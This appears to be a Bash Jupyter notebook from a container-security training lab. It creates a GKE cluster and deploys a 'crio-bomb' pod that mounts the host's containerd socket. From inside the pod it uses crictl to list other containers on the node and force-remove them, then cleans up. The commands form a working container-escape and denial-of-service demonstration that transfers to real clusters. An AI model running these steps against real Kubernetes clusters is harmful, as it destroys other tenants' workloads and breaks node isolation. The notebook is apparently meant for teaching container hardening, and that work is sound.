{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**This notebook covered by the following [license](License.ipynb)  This note must not be removed**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "REGION=europe-west4\n",
    "ZONE=$REGION-b\n",
    "PROJECT=gca-training-0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[1;33mWARNING:\u001b[0m Warning: basic authentication is deprecated, and will be removed in GKE control plane versions 1.19 and newer. For a list of recommended authentication methods, see: https://cloud.google.com/kubernetes-engine/docs/how-to/api-server-authentication\n",
      "\u001b[1;33mWARNING:\u001b[0m The Pod address range limits the maximum size of the cluster. Please refer to https://cloud.google.com/kubernetes-engine/docs/how-to/flexible-pod-cidr to learn how to optimize IP address allocation.\n",
      "\u001b[1;31mERROR:\u001b[0m (gcloud.beta.container.clusters.create) ResponseError: code=400, message=Failed precondition when calling the ServiceConsumerManager: tenantmanager::185014: Consumer 406877729788 should enable service:container.googleapis.com before generating a service account.\n"
     ]
    },
    {
     "ename": "",
     "evalue": "1",
     "execution_count": 2,
     "output_type": "error",
     "traceback": []
    }
   ],
   "source": [
    "gcloud beta container \\\n",
    "  --project \"$PROJECT\" \\\n",
    "  clusters create \"spooky\" \\\n",
    "  --zone \"$ZONE\" \\\n",
    "  --no-enable-basic-auth \\\n",
    "  --cluster-version \"1.18.9-gke.2501\" \\\n",
    "  --release-channel \"rapid\" \\\n",
    "  --machine-type \"e2-medium\" \\\n",
    "  --image-type \"COS_CONTAINERD\" \\\n",
    "  --disk-type \"pd-standard\" \\\n",
    "  --disk-size \"100\" \\\n",
    "  --metadata disable-legacy-endpoints='true' \\\n",
    "  --scopes \"https://www.googleapis.com/auth/cloud-platform\" \\\n",
    "  --num-nodes \"3\" \\\n",
    "  --enable-stackdriver-kubernetes \\\n",
    "  --enable-ip-alias \\\n",
    "  --network \"projects/$PROJECT/global/networks/default\" \\\n",
    "  --subnetwork \"projects/$PROJECT/regions/$REGION/subnetworks/default\" \\\n",
    "  --default-max-pods-per-node \"110\" \\\n",
    "  --no-enable-master-authorized-networks \\\n",
    "  --addons HorizontalPodAutoscaling,HttpLoadBalancing \\\n",
    "  --enable-autoupgrade \\\n",
    "  --enable-autorepair  \\\n",
    "  --max-surge-upgrade 1 \\\n",
    "  --max-unavailable-upgrade 0 \\\n",
    "  --enable-shielded-nodes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "cd ~/import/container-security/critcl"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "gcloud builds submit --tag gcr.io/$PROJECT/crio-bomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "kubectl create -f - <<EOF\n",
    "apiVersion: v1\n",
    "kind: Pod\n",
    "metadata:\n",
    " name: crio-bomb\n",
    "spec:\n",
    " containers:\n",
    " - image: gcr.io/$PROJECT/crio-bomb\n",
    "   name: crio-bomb\n",
    "   volumeMounts:\n",
    "   - mountPath: /run/containerd\n",
    "     name: run-containerd\n",
    " volumes:\n",
    " - name:  run-containerd\n",
    "   hostPath: \n",
    "     path: /run/containerd\n",
    "EOF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "kubectl get pods "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "kubectl exec crio-bomb -- ls -alFtr /run/containerd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "kubectl logs crio-bomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "kubectl exec crio-bomb -- crictl ps "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "DEAD=$(kubectl exec crio-bomb -- crictl ps | awk  '!/(POD|crio-bomb)/{print $1}')\n",
    "echo $DEAD"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "kubectl exec crio-bomb -- crictl rm --force $DEAD"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "kubectl get pods -A"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "kubectl delete pod crio-bomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "gcloud beta container clusters list "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "gcloud beta compute instances list "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "NODE=$(gcloud beta compute instances list | tail -1 | cut -f1 -d\" \")\n",
    "echo $NODE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "gcloud beta compute \\\n",
    " ssh --zone \"$ZONE\" \"$NODE\" \\\n",
    " --project \"$PROJECT\" -- \\\n",
    "sudo ls -alsFtr /run/containerd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "gcloud --quiet beta container clusters delete spooky --zone $ZONE "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Bash",
   "language": "bash",
   "name": "bash"
  },
  "language_info": {
   "codemirror_mode": "shell",
   "file_extension": ".sh",
   "mimetype": "text/x-sh",
   "name": "bash"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
